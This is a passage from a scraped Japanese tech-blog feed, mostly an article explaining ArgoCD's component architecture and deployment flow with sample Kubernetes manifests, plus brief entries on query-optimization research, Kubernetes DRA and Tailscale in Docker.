Mirchevはより統計や探索といった最適化よりの研究をしている。問題意識良い結合順序を見つけることはクエリの性能に対して大きな影響を与えるため、熱心に研究されてきた。古典的なクエリ最適化のアプローチでは以下のステップで動的計画方に基づいた最適化を行なう。1. 有効な結合順序の列挙1. カーディナリティ推定値を入力としたコストモデルの選択理論的にはカーディナリティとコストモデルの推定値が正確であれば、最適なクエリプランを選択することができる。しかし現実にはカーディナリティ推定は一様性や独立性といった単純化された仮定に基づいており、しばしばそのような仮定は間違っているため悲惨な計画を作成する。手法この論文ではカーディナリティ推定器の評価と正確なコストモデルの重要性の評価、そして列挙された結合順序の空間がどの程度影響するのかを以下の方法で検証し、貢献を行なっている。1. IMDBデータを用いたJoin Order BenchmarkというJOINにフォーカスしたベンチマークによる評価を行なう1. 実世界のデータセットにおける現実的なクエリを用いたE2Eの検証を行なう。1. クエリ性能に対するカーディナリティ・コストモデル・列挙アルゴリズムの貢献度を定量化し、最適なクエリプラン生成のためのガイドラインを策定している。作業時間read29:3829:38author33:083:30summary48:4414:36感想時間が無くまとめ途中で切り上げてしまった。やらないよりマシではあるものの、ちゃんと纏めるときにくらべて理解度に影響が出そうなので時間に余裕を持っておきたい。内容自体はGW中にPostgreSQLの実装を読んでいたこともあり、わりと理解しやすかった。","isoDate":"2023-05-08T02:13:43.000Z","dateMiliSeconds":1683512023000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"[Kubernetes 1.27] Dynamic Resource Allocation のいま","link":"https://zenn.dev/toversus/articles/fe2aa06f133b49","contentSnippet":"!Kubernetes 1.27 時点でアルファ機能のため、実装が大きく変わる可能性があります。 はじめにKubeCon Europe 2023 で KEP-3063 Dynamic Resource Allocation (DRA) についての深い話と DRA Resource Driver の実装方法の話があったので、kubernetes-sigs/dra-example-driver をベースに触りながら検証してみました。toVersus/fake-dra-driver で公開しています。Device Plugins 2.0: How to Build a Drive...","isoDate":"2023-05-06T02:11:55.000Z","dateMiliSeconds":1683339115000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"TailscaleをDockerで動かすと、再起動時に認証失敗 or IPアドレスが変わってしまう問題への対処","link":"https://blog.atusy.net/2023/05/05/tailscale-docker/","contentSnippet":"DockerでTailscaleを使ったVPNを構築してみました。公式の案内では以下の手順でauth keyを用いた起動ができます。docker run -d --name=tailscaled \\\\ -v /var/lib:/var/lib -v /dev/net/tun:/dev/net/tun \\\\ --network=host --cap-add=NET_ADMIN --cap-add=NET_RAW \\\\ --env TS_AUTHKEY={{ auth key }} \\\\ tailscale/tailscaleしかし、この方法は公式も記述している通り一時的な（ephemeral）用途向きです。","isoDate":"2023-05-05T00:00:00.000Z","dateMiliSeconds":1683244800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"【ArgoCD\uD83D\uDC19】ArgoCDのマイクロサービスアーキテクチャと自動デプロイの仕組み","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2023/05/02/145115","contentSnippet":"この記事から得られる知識この記事を読むと、以下を \\"完全に理解\\" できます✌️ArgoCDのアーキテクチャを構成するコンポーネントの種類についてArgoCDがマニフェストを自動デプロイする仕組みについてこの記事から得られる知識01. はじめに02. 概要アーキテクチャレイヤーコンポーネント仕組み(1) repo-serverによるクローン取得(2) application-controllerによるマニフェスト取得(3) application-controllerによるCluster確認(4) application-controllerによる処理結果保管(5) argocd-serverによるキャッシュ取得(6) 管理者のログイン(7) IDプロバイダーへの認証フェーズ委譲(8) dex-serverによる認証リクエスト送信(9) argocd-serverによる認可フェーズ実行(10) application-controllerによるマニフェストデプロイ03. repo-serverrepo-serverとは仕組み(1) InitContainerによるお好きなツールインストール & argocd-cliバイナリコピー(2) repo-serverによる認証情報取得(3) repo-serverのよるクローン取得とポーリング(4) repo-serverによるサイドカーコール(5) repo-serverによる暗号化キーと暗号化変数の取得(6) サイドカーによるプラグイン処理の取得(7) サイドカーによるプラグイン処理の実行04. application-controller、redis-serverapplication-controllerとはredis-serverとは仕組み(1) ArgoCD用Cluster管理者のkubectl applyコマンド(2) application-controllerによるArgoCD系カスタムリソースのReconciliation(3) application-controllerによるマニフェスト取得(4) application-controllerによるヘルスチェック(5) application-controllerによるマニフェスト差分検出(6) application-controllerによる処理結果保管(7) application-controllerによるマニフェストデプロイ05. dex-serverdex-serverとは仕組み(1) プロダクト用Cluster管理者のログイン(2) IDプロバイダーへの認証フェーズ委譲(3) dex-serverによる認可リクエスト作成(4) dex-serverによる認可リクエスト送信(5) IDプロバイダーによる認証フェーズ実施(6) argocd-serverによる認可フェーズ実施06. argocd-server (argocd-apiserver)argocd-serverとは仕組み(1) application-controllerによるヘルスチェック(2) application-controllerによるマニフェスト差分検出(3) application-controllerによる処理結果保管(4) application-controllerによる処理結果取得(5) プロダクト用Cluster管理者のログイン(6) Ingressコントローラーによるルーティング(7) IDプロバイダーへの認証フェーズ委譲(8) IDプロバイダーによる認証フェーズ実施(9) argocd-serverによる認可フェーズ実施(10) application-controllerによるマニフェストデプロイ07. アーキテクチャのまとめ08. おわりに謝辞記事関連のおすすめ書籍01. はじめにロケットに乗るタコのツラが腹立つわー。画像引用元：Argo Projectさて最近の業務で、全プロダクトの技術基盤開発チームに携わっており、全プロダクト共有のArgoCD\uD83D\uDC19とAWS EKSをリプレイスしました。今回は、採用した設計プラクティスの紹介も兼ねて、ArgoCDのマイクロサービスアーキテクチャと自動デプロイの仕組みを記事で解説しました。ArgoCDは、kubectlコマンドによるマニフェストのデプロイを自動化するツールです。ArgoCDのアーキテクチャには変遷があり、解説するのは執筆時点 (2023/05/02) で最新の 2.6 系のArgoCDです。アーキテクチャや仕組みはもちろん、個々のマニフェストの実装にもちょっとだけ言及します。それでは、もりもり布教していきます\uD83D\uDE1702. 概要アーキテクチャレイヤーまずは、ArgoCDのアーキテクチャのレイヤーがどのようになっているかを見ていきましょう。ArgoCD公式から、コンポーネント図が公開されています。図から、次のようなことがわかります\uD83D\uDC47下位レイヤー向きにしか依存方向がなく、例えばコアドメインとインフラのレイヤー間で依存性は逆転させていない。レイヤーの種類 (UI、アプリケーション、コアドメイン、インフラ) とそれらの依存方向から、レイヤードアーキテクチャのようなレイヤーに分けている。特にコアドメインレイヤーが独立したコンポーネントに分割されており、マイクロサービスアーキテクチャを採用している。argo-cd/docs/developer-guide/architecture/components.md at v2.8.0 \xb7 argoproj/argo-cd \xb7 GitHub▶ ArgoCDのマイクロサービスアーキテクチャの分割単位についてMonolith to Microservices: Evolutionary Patterns to Transform Your Monolith (English Edition)▶ ArgoCDのマイクロサービスアーキテクチャの設計図についてhttps://microsoft.github.io/code-with-engineering-playbook/design/diagram-types/DesignDiagramsTemplates/componentDiagrams/コンポーネント次に、コンポーネントの種類を紹介します。ArgoCDの各コンポーネントが組み合わさり、マニフェストの自動的なデプロイを実現します。ArgoCD (2.6系) のコンポーネントはいくつかあり、主要なコンポーネントの種類とレイヤーは以下の通りです\uD83D\uDC47 コンポーネント                       レイヤー              機能                                                                                                                                                                                                             argocd-server(argocd-apiserver)  UI・アプリケーション  みんながよく知るArgoCDのダッシュボードです。また、ArgoCDのAPIとしても機能します。現在、複数のレイヤーの責務を持っており、将来的にUIとアプリケーションは異なるコンポーネントに分割されるかもしれません。  application-controller               コアドメイン          Clusterにマニフェストをデプロイします。また、ArgoCD系カスタムリソースのカスタムコントローラーとしても機能します。                                                                                            repo-server                          コアドメイン          マニフェスト/チャートリポジトリからクローンを取得します。また、クローンからマニフェストを作成します。                                                                                                        redis-server                         インフラ              application-controllerの処理結果のキャッシュを保管します。                                                                                                                                                       dex-server                           インフラ              SSOを採用する場合、argocd-serverの代わりに認可リクエストを作成し、またIDプロバイダーに送信します。これにより、argocd-server上の認証フェーズをIDプロバイダーに委譲できます。                                 GitOps and Kubernetes: Continuous Deployment with Argo CD, Jenkins X, and Flux以降の図の凡例です。ArgoCDの各コンポーネント (application-controller、argocd-server、dex-server、repo-server) と各リソース (Application、AppProject) を区別しています。仕組みそれでは、ArgoCDは、どのようにコンポーネントを組み合わせて、マニフェストをデプロイするのでしょうか。ここではプロダクト用Cluster管理者 (デプロイ先となるClusterを管理するエンジニア) は、ArgoCDのダッシュボードを介してマニフェストをデプロイするとしましょう。まずは、概要を説明していきます。(1) repo-serverによるクローン取得ArgoCDのCluster上で、repo-serverがマニフェスト/チャートリポジトリのクローンを取得します。(2) application-controllerによるマニフェスト取得application-controllerは、repo-serverからマニフェストを取得します。(3) application-controllerによるCluster確認application-controllerは、プロダクト用Clusterの現状を確認します。(4) application-controllerによる処理結果保管application-controllerは、処理結果をredis-serverに保管します。(5) argocd-serverによるキャッシュ取得argocd-serverは、redis-serverからキャッシュを取得します。(6) 管理者のログインプロダクト用Cluster管理者は、argocd-serverにログインしようとします。(7) IDプロバイダーへの認証フェーズ委譲argocd-serverは、ログイン時にIDプロバイダーに認証フェーズを委譲するために、dex-serverをコールします。▶ argocd-serverのログイン手法について(8) dex-serverによる認証リクエスト送信dex-serverは、IDプロバイダーに認可リクエストを作成し、これをIDプロバイダーに送信します。(9) argocd-serverによる認可フェーズ実行argocd-serverで認可フェーズを実施します。ログインが完了し、プロダクト用Cluster管理者は認可スコープに応じてダッシュボードを操作できます。▶ ArgoCDをどのClusterで管理するかについて(10) application-controllerによるマニフェストデプロイapplication-controllerは、Clusterにマニフェストをデプロイします。マニフェストのデプロイの仕組みをざっくり紹介しました。ただこれだと全く面白くないため、各コンポーネントの具体的な処理と、各々がどのように通信しているのかを説明します✌️03. repo-serverrepo-serverとはまずは、コアドメインレイヤーにあるrepo-serverです。マニフェスト/チャートリポジトリ (例：GiHub、GitHub Pages、Artifact Hub、AWS ECR、Artifact Registryなど) からクローンを取得します。repo-serverを持つPodには、他に軽量コンテナイメージからなるInitContainerとサイドカー (cmp-server) がおり、それぞれ機能が切り分けられています\uD83D\uDC4D仕組み(1) InitContainerによるお好きなツールインストール & argocd-cliバイナリコピーrepo-serverの起動時に、InitContainerでお好きなマニフェスト管理ツール (Helm、Kustomizeなど) やプラグイン (helm-secrets、KSOPS、SOPS、argocd-vault-pluginなど) をインストールします。また、サイドカーのcmp-serverでは起動時に/var/run/argocd/argocd-cmp-serverコマンドを実行する必要があり、InitContainer (ここではcopyutilコンテナ) を使用して、ArgoCDのコンテナイメージからargocd-cliのバイナリファイルをコピーします。repo-serverのざっくりした実装例は以下の通りです\uD83D\uDC47ここでは、ArgoCDで使いたいツール (Helm、SOPS、helm-secrets) をInitContainerでインストールしています。apiVersion: v1kind: Podmetadata:  name: argocd-repo-server  namespace: argocdspec:  containers:    - name: repo-server      image: quay.io/argoproj/argocd:latest  initContainers:    # HelmをインストールするInitContainer    - name: helm-installer      image: alpine:latest      command:        - /bin/sh        - -c      args:        - |          # インストール処理      volumeMounts:        - mountPath: /custom-tools          name: custom-tools    # SOPSをインストールするInitContainer    - name: sops-installer      image: alpine:latest      command:        - /bin/sh        - -c      args:        - |          # インストール処理      volumeMounts:        - mountPath: /custom-tools          name: custom-tools    # helm-secretsをインストールするInitContainer    - name: helm-secrets-installer      image: alpine:latest      command:        - /bin/sh        - -c      args:        - |          # インストール処理      volumeMounts:        - mountPath: /helm-working-dir/plugins          name: helm-working-dir    ...    # cmp-serverにargocd-cliのバイナリをコピーするInitContainer    - name: copyutil      image: quay.io/argoproj/argocd:latest      command:        - cp        - -n        - /usr/local/bin/argocd        - /var/run/argocd/argocd-cmp-server      volumeMounts:        - name: var-files          mountPath: /var/run/argocd  # Podの共有ボリューム  volumes:    - name: custom-tools      emptyDir: {}    - name: var-files      emptyDir: {}Custom Tooling - Argo CD - Declarative GitOps CD for Kubernetes▶ ArgoCDのコンテナイメージに組み込まれているツールについてquay.io/argoproj/argocd) には、いくつかのツール (例：Helm、Kustomize、Ks、Jsonnetなど) の推奨バージョンがあらかじめインストールされています。そのため、これらのツールのプラグイン (例：helm-secrets) を使用する場合、上記のコンテナイメージからなるrepo-server内のツールをcmp-serverにコピーすればよいのでは、と思った方がいるかもしれません。この方法は全く問題なく、cmp-serverの/usr/local/binディレクトリ配下にツールをコピーするように、InitContainerを定義してもよいです。apiVersion: v1kind: Podmetadata:  name: argocd-repo-server  namespace: foospec:  containers:    - name: repo-server      image: quay.io/argoproj/argocd:latest      volumeMounts:        - mountPath: /usr/local/bin/helm          # Podの共有ボリュームを介して、repo-serverでHelmを使用する。          name: custom-tools  initContainers:    - name: copy-helm      image: quay.io/argoproj/argocd:latest      # InitContainer上のHelmをVolumeにコピーする      command:        - /bin/cp        - -n        - /usr/local/bin/helm        - /custom-tools/helm      volumeMounts:        - mountPath: /custom-tools          name: custom-tools  # 共有ボリューム  volumes:    - name: custom-tools      emptyDir: {}反対に、これらツールをInitContainerでインストールし直す場合は、ArgoCD上での推奨バージョンをちゃんとインストールするようにしましょう\uD83D\uDC4D2.6系では、ArgoCDのリポジトリ内のtool-versions.shファイルに、Helmのバージョンが定義されています。spec:  ...  initContainers:    - name: helm-installer      image: alpine:latest      command:        - /bin/sh        - -c      # ArgoCDのリポジトリ上のtool-versions.shファイルから、Helmのバージョンを取得する      args:        - |          apk --update add curl wget          ARGOCD_VERSION=$(curl -s https://raw.githubusercontent.com/argoproj/argo-helm/argo-cd-<ArgoCDのバージョン>/charts/argo-cd/Chart.yaml | grep appVersion | sed -e \'s/^[^: ]*: //\')          HELM_RECOMMENDED_VERSION=$(curl -s https://raw.githubusercontent.com/argoproj/argo-cd/\\"${ARGOCD_VERSION}\\"/hack/tool-versions.sh | grep helm3_version | sed -e \'s/^[^=]*=//\')          wget -q https://get.helm.sh/helm-v\\"${HELM_RECOMMENDED_VERSION}\\"-linux-amd64.tar.gz          tar -xvf helm-v\\"${HELM_RECOMMENDED_VERSION}\\"-linux-amd64.tar.gz          cp ./linux-amd64/helm /custom-tools/          chmod +x /custom-tools/helm      volumeMounts:        - mountPath: /custom-tools          name: custom-tools  ...argo-cd/hack/tool-versions.sh at v2.6.0 \xb7 argoproj/argo-cd \xb7 GitHub(2) repo-serverによる認証情報取得repo-serverは、Secret (argocd-repo-creds) からリポジトリの認証情報を取得します。argocd-repo-credsではリポジトリの認証情報のテンプレートを管理しています。指定した文字列から始まる (前方一致) URLを持つリポジトリに接続する場合、それらの接続で認証情報を一括して適用できます。argocd-repo-credsのざっくりした実装例は以下の通りです\uD83D\uDC47ここでは、リポジトリのSSH公開鍵認証を採用し、argocd-repo-credsに共通の秘密鍵を設定しています。apiVersion: v1kind: Secretmetadata:  name: argocd-repo-creds-github  namespace: argocd  labels:    argocd.argoproj.io/secret-type: repo-credstype: Opaquedata:  type: git  url: https://github.com/hiroki-hasegawa  # 秘密鍵  sshPrivateKey: |    MIIC2 ...あとは、各リポジトリのSecret (argocd-repo) にURLを設定しておきます。すると、先ほどのargocd-repo-credsのURLに前方一致するURLを持つSecretには、一括して秘密鍵が適用されます。# foo-repositoryをポーリングするためのargocd-repoapiVersion: v1kind: Secretmetadata:  namespace: argocd  name: foo-argocd-repo  labels:    argocd.argoproj.io/secret-type: repositorytype: Opaquedata:  # 認証情報は設定しない。  # チャートリポジトリ名  name: bar-repository  # https://github.com/hiroki-hasegawa に前方一致する。  url: https://github.com/hiroki-hasegawa/bar-chart.git---# baz-repositoryをポーリングするためのargocd-repoapiVersion: v1kind: Secretmetadata:  namespace: foo  name: baz-argocd-repo  labels:    argocd.argoproj.io/secret-type: repositorytype: Opaquedata:  # 認証情報は設定しない。  # チャートリポジトリ名  name: baz-repository  # https://github.com/hiroki-hasegawa に前方一致する。  url: https://github.com/hiroki-hasegawa/baz-chart.gitDeclarative Setup - Argo CD - Declarative GitOps CD for Kubernetes(3) repo-serverのよるクローン取得とポーリングrepo-serverは、認証情報を使用して、リポジトリにgit cloneコマンドを実行します。取得したクローンを、/tmp/_argocd-repoディレクトリ配下にUUIDの名前で保管します。また、リポジトリの変更をポーリングし、変更を検知した場合はgit fetchコマンドを実行します。# クローンが保管されていることを確認できる$ kubectl -it exec argocd-repo-server \\\\    -c repo-server \\\\    -n foo \\\\    -- bash -c \\"ls /tmp/_argocd-repo/<URLに基づくUUID>\\"# リポジトリ内のファイルChart.yaml  README.md  templates  values.yamlcustom repo-server - where is the local cache kept? \xb7 argoproj argo-cd \xb7 Discussion #9889 \xb7 GitHub▶ repo-serverでのクローン保管先のバージョン差異について2.3以前では、repo-serverは/tmpディレクトリ配下にURLに基づく名前でクローンを保管します。$ kubectl -it exec argocd-repo-server \\\\    -c repo-server \\\\    -n foo \\\\    -- bash -c \\"ls /tmp/https___github.com_hiroki-hasegawa_foo-repository\\"# リポジトリ内のファイルChart.yaml  README.md  templates  values.yaml(4) repo-serverによるサイドカーコールrepo-serverは、自身にマウントされたいくつかのマニフェスト管理ツール (例：Helm、Kustomize) を実行する機能を持っています。しかし、実行できないツールではサイドカー (cmp-server) をコールします。この時、Applicationの.spec.source.pluginキーでプラグイン名を指定すると、そのApplicationではサイドカーをコールします。逆を言えば、プラグイン名を指定していないApplicationは、サイドカーをコールしない です。apiVersion: argoproj.io/v1alpha1kind: Applicationmetadata:  name: foo-application  namespace: foospec:  source:    plugin:      name: helm-secrets # このプラグイン名は、ConfigManagementPluginのmetadata.nameキーに設定したもの  ...このコールは、Volume上のUnixドメインソケットを経由します。Unixドメインソケットのエンドポイントの実体は.sockファイルです。$ kubectl exec -it argocd-repo-server -c foo-plugin-cmp-server\\\\    -- bash -c \\"ls /home/argocd/cmp-server/plugins/\\"foo-plugin.sock▶ UnixソケットドメインについてASCII.jp：Unixドメインソケット (1/2)(5) repo-serverによる暗号化キーと暗号化変数の取得cmp-serverは、暗号化キー (例：AWS KMS、Google CKMなど) を使用してSecretストア (例：AWS SecretManager、Google SecretManager、SOPS、Vaultなど) の暗号化変数を復号化します。▶ クラウドプロバイダーの暗号化キーを使用するために必要な証明書について/etc/sslディレクトリ (ディレクトリはOSによって異なる) に証明書が無く、cmp-serverがHTTPSプロトコルを使用できない可能性があります。その場合は、お好きな方法で証明書をインストールし、コンテナにマウントするようにしてください\uD83D\uDC4DapiVersion: v1kind: Podmetadata:  name: argocd-repo-server  namespace: foospec:  containers:    - name: repo-server      image: quay.io/argoproj/argocd:latest  ...    # サイドカーのcmp-server    - name: helm-secrets-cmp-server      image: ubuntu:latest      ...      volumeMounts:        # サイドカーがAWS KMSを使用する時にHTTPSリクエストを送信する必要があるため、証明書をマウントする        - name: certificate          mountPath: /etc/ssl  ...  initContainers:    - name: certificate-installer      image: ubuntu:latest      command:        - /bin/sh        - -c      args:        - |          apt-get update -y          # ルート証明書をインストールする          apt-get install -y ca-certificates          # 証明書を更新する          update-ca-certificates      volumeMounts:        - mountPath: /etc/ssl          name: certificate  volumes:    - name: certificate      emptyDir: {}(6) サイドカーによるプラグイン処理の取得cmp-serverは、マニフェスト管理ツールのプラグイン (helm-secrets、argocd-vault-pluginなど) を実行します。この時マニフェストの作成時のプラグインとして、ConfigMap配下のConfigManagementPluginでプラグインの処理を定義します。ざっくりした実装例は以下の通りです\uD83D\uDC47ここでは、プラグインとしてhelm-secretsを採用し、helm secrets templateコマンドの実行を定義します。apiVersion: v1kind: ConfigMapmetadata:  name: argocd-cmp-cm  namespace: foodata:  helm-secrets-plugin.yaml: |    apiVersion: argoproj.io/v1alpha1    kind: ConfigManagementPlugin    metadata:      namespace: foo      name: helm-secrets # このプラグイン名は、Applicationのspec.source.pluginキーで指定したもの    spec:      generate:        command:          - /bin/bash          - -c        args:          - |            set -o pipefail            helm secrets template -f $ARGOCD_ENV_SECRETS -f $ARGOCD_ENV_VALUES -n $ARGOCD_APP_NAMESPACE $ARGOCD_APP_NAME .  foo-plugin.yaml: |    ...▶ ConfigManagementPluginのファイル名について(7) サイドカーによるプラグイン処理の実行cmp-serverはプラグインを実行し、Secretを含むマニフェストを作成します。ConfigMap配下のファイルをplugin.yamlの名前でサイドカーにマウントする必要があります。また、先ほどのUnixドメインソケットの.sockファイルや、 cmp-serverがプラグインを実行するための各バイナリファイルもマウントが必要です。ざっくりした実装例は以下の通りです\uD83D\uDC47ここでは、helm-secretsプラグインを実行するサイドカー (helm-secrets-cmp-server) を作成します。apiVersion: v1kind: Podmetadata:  name: argocd-repo-serverspec:  containers:    # repo-server    - name: repo-server      image: quay.io/argoproj/argocd:latest    ...    # helm-secretsのcmp-server    - name: helm-secrets-cmp-server      # コンテナイメージは軽量にする      image: ubuntu:latest      command:        - /var/run/argocd/argocd-cmp-server      env:        # helmプラグインの場所を設定する        - name: HELM_PLUGINS          value: /helm-working-dir/plugins      securityContext:        runAsNonRoot: true        runAsUser: 999      volumeMounts:        # リポジトリのクローンをコンテナにマウントする        - name: tmp          mountPath: /tmp        # ConfigManagementPluginのマニフェスト (helm-secrets.yaml) を \\"plugin.yaml\\" の名前でコンテナにマウントする        - name: argocd-cmp-cm          mountPath: /home/argocd/cmp-server/config/plugin.yaml          subPath: helm-secrets.yaml        # コンテナ間で通信するためのUnixドメインソケットファイルをコンテナにマウントする        - name: plugins          mountPath: /home/argocd/cmp-server/plugins        # 任意のツールのバイナリファイルをコンテナにマウントする        - name: custom-tools          mountPath: /usr/local/bin        # helmプラグインのバイナリをコンテナにマウントする        - name: helm-working-dir          mountPath: /helm-working-dir/plugins      ...  # Podの共有ボリューム  volumes:    # リポジトリのクローンを含む    - name: tmp      emptyDir: {}    # Helmなどの任意のツールを含む    - name: custom-tools      emptyDir: {}    # helmプラグインを含む    - name: helm-working-dir      emptyDir: {}▶ マウント時のConfigManagementPluginのファイル名についてv2.6では、ConfigManagementPluginのマニフェストを/home/argocd/cmp-server/configディレクトリに、plugin.yamlの名前でマウントしないといけません。これは、cmp-serverの起動コマンド (/var/run/argocd/argocd-cmp-server) がplugin.yamlの名前しか扱えないためです。ArgoCD公式の見解で、サイドカーでは単一のプラグインしか実行できないように設計しているとのコメントがありました。今後のアップグレードで改善される可能性がありますが、v2.6では、ConfigManagementPluginの数だけcmp-serverが必要になってしまいます\uD83D\uDE47\uD83C\uDFFB‍use multiple plugins in sidecar installation method \xb7 argoproj argo-cd \xb7 Discussion #12278 \xb7 GitHub▶ Kustomizeのプラグインをどのコンテナで実行するかについて▶ クラウドプロバイダーのSecretストアを採用する場合についてHow to Manage Kubernetes Secrets with GitOps for Secure Deployments - Akuity Blog04. application-controller、redis-serverapplication-controllerとはコアドメインレイヤーにあるapplication-controllerです。Clusterにマニフェストをデプロイします。また、ArgoCD系カスタムリソースのカスタムコントローラーとしても機能します。redis-serverとはインフラレイヤーにあるredis-serverです。application-controllerの処理結果のキャッシュを保管します。仕組み(1) ArgoCD用Cluster管理者のkubectl applyコマンドArgoCD用Clusterの管理者は、ClusterにArgoCD系のカスタムリソース (例：Application、AppProjectなど)　をデプロイします。▶ ArgoCD自体のデプロイにargo-helmを採用する場合についてGitHub - argoproj/argo-helm: ArgoProj Helm ChartsただしHelmの重要な仕様として、チャートの更新時に使用するhelm upgradeコマンドは、CRDを作成できる一方でこれを変更できません。HelmでCRDを作成するとHelmの管理ラベルが挿入されてしまうため、作成の時点からCRDがHelmの管理外となるように、kubectlコマンドでCRDを作成した方がよいです\uD83D\uDC4D$ kubectl diff -k \\"https://github.com/argoproj/argo-cd/manifests/crds?ref=<バージョンタグ>\\"$ kubectl apply -k \\"https://github.com/argoproj/argo-cd/manifests/crds?ref=<バージョンタグ>\\"ArgoCD上でHelmを使用してデプロイする場合はこの仕様を気にしなくてよいのかな、と思った方がいるかもしれないです。ですが本記事で解説した通り、ArgoCDはcmp-serverのhelm templateコマンド (この時、--include-crdsオプションが有効になっている) や、application-controllerのkubectl applyコマンドを組み合わせてマニフェストをデプロイしているため、CRDもちゃんと更新してくれます\uD83D\uDC4D\uD83C\uDFFB️Helm | Custom Resource Definitions(2) application-controllerによるArgoCD系カスタムリソースのReconciliationkube-controller-managerは、application-controllerを操作し、Reconciliationを実施します。application-controllerは、Etcd上に永続化されたマニフェストと同じ状態のArgoCD系カスタムリソースを作成/変更します。▶ カスタムコントローラーでもあるapplication-controllerについてHow Operators work in Kubernetes | Red Hat Developer(3) application-controllerによるマニフェスト取得application-controllerは、repo-serverからリポジトリのマニフェストを取得します。取得したマニフェストは、repo-serverのサイドカーであるcmp-serverが作成したものです。(4) application-controllerによるヘルスチェックapplication-controllerは、プロダクト用Clusterをヘルスチェックします。application-controllerには、gitops-engineパッケージが内蔵されており、これはヘルスチェックからデプロイまでの基本的な処理を実行します。▶ gitops-engineパッケージについてv0.7.0 では以下のディレクトリからなります\uD83D\uDC47\uD83D\uDC31 gitops-engine/├── \uD83D\uDCC2 pkg│    ├── cache│    ├── diff   # リポジトリとClusterの間のマニフェストの差分を検出する。ArgoCDのDiff機能に相当する。│    ├── engine # 他のパッケージを使い、GitOpsの一連の処理を実行する。│    ├── health # Clusterのステータスをチェックする。ArgoCDのヘルスチェック機能に相当する。│    ├── sync   # Clusterにマニフェストをデプロイする。ArgoCDのSync機能に相当する。│    └── utils  # 他のパッケージに汎用的な関数を提供する。│...gitops-engine/specs/design-top-down.md at v0.7.0 \xb7 argoproj/gitops-engine \xb7 GitHub(5) application-controllerによるマニフェスト差分検出application-controllerは、プロダクト用Clusterのマニフェストと、repo-serverから取得したマニフェストの差分を検出します。ここで、kubectl diffコマンドの実行が自動化されています。(6) application-controllerによる処理結果保管application-controllerは、処理結果をredis-serverに保管します。redis-serverは、Applicationやリポジトリのコミットの単位で、application-controllerの処理結果を保管しています。$ kubectl exec -it argocd-redis-server \\\\    -n foo \\\\    -- sh -c \\"redis-cli --raw\\"127.0.0.1:6379> keys *...app|resources-tree|<Application名>|<キャッシュバージョン>cluster|info|<プロダクト用ClusterのURL>|<キャッシュバージョン>git-refs|<マニフェスト/チャートリポジトリのURL>|<キャッシュバージョン>mfst|app.kubernetes.io/instance|<Application名>|<最新のコミットハッシュ値>|<デプロイ先Namespace>|*****|<キャッシュバージョン>...(7) application-controllerによるマニフェストデプロイapplication-controllerは、Applicationの操作に応じて、Clusterにマニフェストをデプロイします。ここで、kubectl applyコマンドの実行が自動化されています。▶ application-controllerがマニフェストを操作した証拠についてmetadata.managedFieldsキーがあり、何がそのマニフェストを作成/変更したのかを確認できます。実際にマニフェストを確認してみると、確かにapplication-controllerがマニフェストを作成/変更してくれたことを確認できます。apiVersion: apps/v1kind: Deploymentmetadata:  managedFields:    # ArgoCDのapplication-controllerによる管理    - manager: argocd-application-controller      apiVersion: apps/v1      # kube-apiserverに対するリクエスト内容      operation: Update      time: \\"2022-01-01T16:00:00.000Z\\"      # ArgoCDのapplication-controllerが管理するマニフェストのキー部分      fields: ...️Server-Side Apply | Kubernetes05. dex-serverdex-serverとはインフラレイヤーにあるdex-serverです。SSO (例：OAuth 2.0、SAML、OIDC) を採用する場合、argocd-serverの代わりに認可リクエストを作成し、またIDプロバイダー (例：GitHub、Keycloak、AWS Cognito、Google Authなど) に送信します。これにより、argocd-server上の認証フェーズをIDプロバイダーに委譲できます。GitHub - dexidp/dex: OpenID Connect (OIDC) identity and OAuth 2.0 provider with pluggable connectors▶ dex-serverの必要性について2.0、SAML) を使用する場合は、dex-serverを採用する必要があります\uD83D\uDC4D️Overview - Argo CD - Declarative GitOps CD for Kubernetes仕組み(1) プロダクト用Cluster管理者のログインプロダクト用Cluster管理者がダッシュボード (argocd-server) にSSOを使用してログインしようとします。(2) IDプロバイダーへの認証フェーズ委譲argocd-serverは、認証フェーズをIDプロバイダーに委譲するために、dex-serverをコールします。▶ 認証フェーズの委譲についてAuthentication and Authorization - Argo CD - Declarative GitOps CD for Kubernetes(3) dex-serverによる認可リクエスト作成dex-serverは、認可リクエストを作成します。認可リクエストに必要な情報は、ConfigMap (argocd-cm) で設定しておく必要があります。argocd-cmのざっくりした実装例は以下の通りです\uD83D\uDC47ここでは、IDプロバイダーをGitHubとし、認可リクエストに必要なクライアントIDとクライアントシークレットを設定しています。apiVersion: v1kind: ConfigMapmetadata:  namespace: foo  name: argocd-cmdata:  dex.config: |    connectors:      - type: github        id: github        name: GitHub SSO        config:          clientID: *****          clientSecret: *****        # dex-serverが認可レスポンスによるリダイレクトを受信するURLを設定する        redirectURI: https://example.com/api/dex/callback▶ dex-serverの設定についてdex.configキー配下の設定方法は、dexのドキュメントをみるとよいです\uD83D\uDC4DAuthentication Through GitHub |(4) dex-serverによる認可リクエスト送信dex-serverは、前の手順で作成した認可リクエストをIDプロバイダーに送信します。(5) IDプロバイダーによる認証フェーズ実施IDプロバイダー側でSSOの認証フェーズを実施します。IDプロバイダーは、コールバックURL (<ArgoCDのドメイン名>/api/dex/callback) を指定して、認可レスポンスを送信します。認可レスポンスはリダイレクトを発生させ、argocd-serverを介して、再びdex-serverに届きます。この後、dex-serverはIDプロバイダーのトークンエンドポイントにリクエストを送信し、またIDプロバイダーからトークン (アクセストークン、IDトークンなど) やユーザー情報を取得します。ただ、SSOの種類によって仕組みが異なるため、詳細は省略します。▶ dex-serverのコールバックURLについてDeveloper settingsタブ でSSOを設定する必要があり、この時にAuthorization callback URLという設定箇所があるはずです\uD83D\uDC4D\uD83C\uDFFB(6) argocd-serverによる認可フェーズ実施argocd-serverは、AuthZで認可フェーズを実施します。ConfigMap (argocd-rbac-cm) を参照し、IDプロバイダーから取得したユーザーやグループに、ArgoCD系カスタムリソースに関する認可スコープを付与します。ざっくりした実装例は以下の通りです\uD83D\uDC47ここでは、developerロールにはdevというAppProjectに属するArgoCD系カスタムリソースにのみ、またmaintainerロールには全てのAppProjectの操作を許可しています。またこれらのロールを、IDプロバイダーで認証されたグループに紐づけています。特定のArgoCD系カスタムリソースのみへのアクセスを許可すれば、結果として特定のClusterへのデプロイのみを許可したことになります\uD83D\uDC4DapiVersion: v1kind: ConfigMapmetadata:  name: argocd-rbac-cm  namespace: foodata:  # デフォルトのロール  policy.default: role:developer  policy.csv: |    